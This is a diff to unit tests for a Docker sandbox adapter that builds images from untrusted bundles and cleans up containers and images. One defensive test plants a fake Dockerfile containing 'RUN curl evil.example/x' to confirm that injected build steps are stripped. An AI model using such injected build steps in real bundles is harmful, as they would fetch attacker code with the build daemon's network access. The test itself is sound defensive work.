@@ -23,7 +23,12 @@ import pytest
 
 from cortexward.ports import EgressPolicy, ExecutionSpec, ResourceLimits, SandboxPort
 from cortexward.sandbox import DockerSandboxAdapter
-from cortexward.sandbox.docker_adapter import _cpu_limit, build_create_argv
+from cortexward.sandbox.docker_adapter import (
+    _DOCKERFILE_PATH,
+    _build_context_tar,
+    _cpu_limit,
+    build_create_argv,
+)
 
 pytestmark = pytest.mark.unit
 
@@ -110,10 +115,10 @@ def _make_fake_run(
 
     def _fake_run(argv: list[str], **kwargs: object) -> _FakeCompletedProcess:
         subcommand = argv[1]
+        if subcommand == "build":
+            return _FakeCompletedProcess(returncode=0)  # image built from the bundle
         if subcommand == "create":
             return _FakeCompletedProcess(returncode=0)
-        if subcommand == "cp" and argv[2] == "-":
-            return _FakeCompletedProcess(returncode=0)  # input bundle copied in
         if subcommand == "start":
             if start_timeout:
                 timeout = kwargs.get("timeout")
@@ -130,7 +135,7 @@ def _make_fake_run(
             if output_tar is None:
                 return _FakeCompletedProcess(returncode=1)  # /output doesn't exist
             return _FakeCompletedProcess(returncode=0, stdout=output_tar)
-        if subcommand in ("kill", "rm"):
+        if subcommand in ("kill", "rm", "rmi"):
             return _FakeCompletedProcess(returncode=0)
         raise AssertionError(f"unexpected docker subcommand: {argv}")
 
@@ -163,6 +168,8 @@ class TestBuildCreateArgv:
         assert "--read-only" in argv
         assert "--tmpfs" in argv
         assert argv[argv.index("--tmpfs") + 1] == "/tmp"  # noqa: S108
+        assert argv.count("--tmpfs") == 2
+        assert "/output" in argv
         assert "no-new-privileges" in argv
         assert "--cap-drop" in argv
         assert argv[argv.index("--cap-drop") + 1] == "ALL"
@@ -210,6 +217,69 @@ class TestBuildCreateArgv:
     def test_uses_the_given_docker_binary_path(self) -> None:
         argv = build_create_argv(_spec(), name="c1", docker="/usr/local/bin/docker")
         assert argv[0] == "/usr/local/bin/docker"
+
+    def test_image_override_replaces_spec_image(self) -> None:
+        argv = build_create_argv(_spec(), name="c1", image="cortexward-build-abc123")
+        assert "cortexward-build-abc123" in argv
+        assert "python:3.11-slim" not in argv
+
+    def test_no_image_override_falls_back_to_spec_image(self) -> None:
+        argv = build_create_argv(_spec(), name="c1")
+        assert "python:3.11-slim" in argv
+
+
+class TestBuildContextTar:
+    """`_build_context_tar` merges a synthetic Dockerfile with the caller's bundle."""
+
+    def test_contains_a_dockerfile_that_from_copy_workdirs_the_given_image(self) -> None:
+        context = _build_context_tar("python:3.11-slim", _tar_bytes({}))
+        with tarfile.open(fileobj=io.BytesIO(context), mode="r") as tar:
+            dockerfile = tar.extractfile(_DOCKERFILE_PATH)
+            assert dockerfile is not None
+            content = dockerfile.read().decode("utf-8")
+        assert "FROM python:3.11-slim" in content
+        assert "COPY . /workspace" in content
+        assert "WORKDIR /workspace" in content
+
+    def test_bundle_files_are_merged_into_the_context(self) -> None:
+        context = _build_context_tar("python:3.11-slim", _tar_bytes({"hello.txt": "world"}))
+        with tarfile.open(fileobj=io.BytesIO(context), mode="r") as tar:
+            names = tar.getnames()
+            assert "hello.txt" in names
+            extracted = tar.extractfile("hello.txt")
+            assert extracted is not None
+            assert extracted.read() == b"world"
+
+    def test_an_empty_bundle_still_produces_a_valid_context(self) -> None:
+        context = _build_context_tar("python:3.11-slim", _tar_bytes({}))
+        with tarfile.open(fileobj=io.BytesIO(context), mode="r") as tar:
+            assert tar.getnames() == [_DOCKERFILE_PATH]
+
+    def test_genuinely_empty_bytes_are_treated_the_same_as_an_empty_tar(self) -> None:
+        context = _build_context_tar("python:3.11-slim", b"")
+        with tarfile.open(fileobj=io.BytesIO(context), mode="r") as tar:
+            assert tar.getnames() == [_DOCKERFILE_PATH]
+
+    def test_a_bundle_supplied_dockerfile_at_the_reserved_path_is_dropped(self) -> None:
+        # ADR-0004: the bundle is untrusted input. A malicious bundle that
+        # tries to overwrite the reserved Dockerfile path (to inject its own
+        # RUN steps, which would execute with the *daemon's* own network
+        # access during the build) must never win.
+        malicious_bundle = _tar_bytes({_DOCKERFILE_PATH: "FROM scratch\nRUN curl evil.example/x"})
+        context = _build_context_tar("python:3.11-slim", malicious_bundle)
+        with tarfile.open(fileobj=io.BytesIO(context), mode="r") as tar:
+            dockerfile = tar.extractfile(_DOCKERFILE_PATH)
+            assert dockerfile is not None
+            content = dockerfile.read().decode("utf-8")
+        assert "FROM python:3.11-slim" in content
+        assert "curl" not in content
+
+    def test_other_files_under_the_reserved_directory_are_also_dropped(self) -> None:
+        bundle = _tar_bytes({".cortexward-build/sneaky.txt": "not welcome"})
+        context = _build_context_tar("python:3.11-slim", bundle)
+        with tarfile.open(fileobj=io.BytesIO(context), mode="r") as tar:
+            names = tar.getnames()
+        assert ".cortexward-build/sneaky.txt" not in names
 
 
 class TestProtocolConformance:
@@ -275,20 +345,42 @@ class TestExecuteMocked:
         with pytest.raises(RuntimeError, match=r"docker create failed.*invalid --cpus value"):
             adapter.execute(_spec(bundle_ref=bundle_ref))
 
-    def test_a_failed_bundle_copy_raises_with_stderr(self, monkeypatch: pytest.MonkeyPatch) -> None:
+    def test_a_failed_build_raises_with_stderr(self, monkeypatch: pytest.MonkeyPatch) -> None:
         def _fake_run(argv: list[str], **kwargs: object) -> _FakeCompletedProcess:
-            if argv[1] == "create":
-                return _FakeCompletedProcess(returncode=0)
-            if argv[1] == "cp" and argv[2] == "-":
-                return _FakeCompletedProcess(returncode=1, stderr=b"no such directory")
+            if argv[1] == "build":
+                return _FakeCompletedProcess(returncode=1, stderr=b"unknown instruction")
             return _FakeCompletedProcess(returncode=0)
 
         monkeypatch.setattr(subprocess, "run", _fake_run)
         store = _InMemoryArtifactStore()
         bundle_ref = store.put_artifact(_tar_bytes({}))
         adapter = DockerSandboxAdapter(store, docker="/fake/docker")
-        with pytest.raises(RuntimeError, match=r"docker cp.*no such directory"):
+        with pytest.raises(RuntimeError, match=r"docker build failed.*unknown instruction"):
             adapter.execute(_spec(bundle_ref=bundle_ref))
+
+    def test_a_failed_build_still_cleans_up_nothing_further(
+        self, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        # A build failure happens before any container exists -- `docker rm`
+        # should never even be attempted, only the (harmless, best-effort)
+        # `docker rmi` cleanup of whatever the failed build tag was.
+        calls: list[list[str]] = []
+
+        def _fake_run(argv: list[str], **kwargs: object) -> _FakeCompletedProcess:
+            calls.append(argv)
+            if argv[1] == "build":
+                return _FakeCompletedProcess(returncode=1, stderr=b"boom")
+            return _FakeCompletedProcess(returncode=0)
+
+        monkeypatch.setattr(subprocess, "run", _fake_run)
+        store = _InMemoryArtifactStore()
+        bundle_ref = store.put_artifact(_tar_bytes({}))
+        adapter = DockerSandboxAdapter(store, docker="/fake/docker")
+        with pytest.raises(RuntimeError):
+            adapter.execute(_spec(bundle_ref=bundle_ref))
+        subcommands = [call[1] for call in calls]
+        assert "rm" not in subcommands
+        assert "rmi" in subcommands
 
     def test_a_successful_run_returns_its_output(self, monkeypatch: pytest.MonkeyPatch) -> None:
         monkeypatch.setattr(
@@ -411,15 +503,18 @@ class TestExecuteMocked:
         result = adapter.execute(_spec(bundle_ref=bundle_ref))
         assert result.artifact_refs == ()
 
-    def test_the_container_is_always_removed_even_on_failure(
+    def test_the_container_and_built_image_are_always_removed_even_on_failure(
         self, monkeypatch: pytest.MonkeyPatch
     ) -> None:
         rm_calls: list[list[str]] = []
+        rmi_calls: list[list[str]] = []
         fake_run = _make_fake_run()
 
         def _tracking_run(argv: list[str], **kwargs: object) -> _FakeCompletedProcess:
             if argv[1] == "rm":
                 rm_calls.append(argv)
+            elif argv[1] == "rmi":
+                rmi_calls.append(argv)
             return fake_run(argv, **kwargs)
 
         monkeypatch.setattr(subprocess, "run", _tracking_run)
@@ -430,6 +525,9 @@ class TestExecuteMocked:
         assert len(rm_calls) == 1
         assert rm_calls[0][0] == "/fake/docker"
         assert "-f" in rm_calls[0]
+        assert len(rmi_calls) == 1
+        assert rmi_calls[0][0] == "/fake/docker"
+        assert "-f" in rmi_calls[0]
 
 
 @pytest.mark.skipif(not _docker_daemon_reachable(), reason="no local Docker daemon reachable")
@@ -479,11 +577,9 @@ class TestLiveDocker:
         store = _InMemoryArtifactStore()
         bundle_ref = store.put_artifact(_tar_bytes({}))
         adapter = DockerSandboxAdapter(store)
-        script = (
-            "import pathlib; "
-            "pathlib.Path('/output').mkdir(); "
-            "pathlib.Path('/output/poc.txt').write_text('evidence')"
-        )
+        # /output already exists as the --tmpfs mount point, so the command
+        # only needs to write into it, not create it.
+        script = "import pathlib; pathlib.Path('/output/poc.txt').write_text('evidence')"
         spec = _spec(command=("python3", "-c", script), bundle_ref=bundle_ref)
         result = adapter.execute(spec)
         assert len(result.artifact_refs) == 1
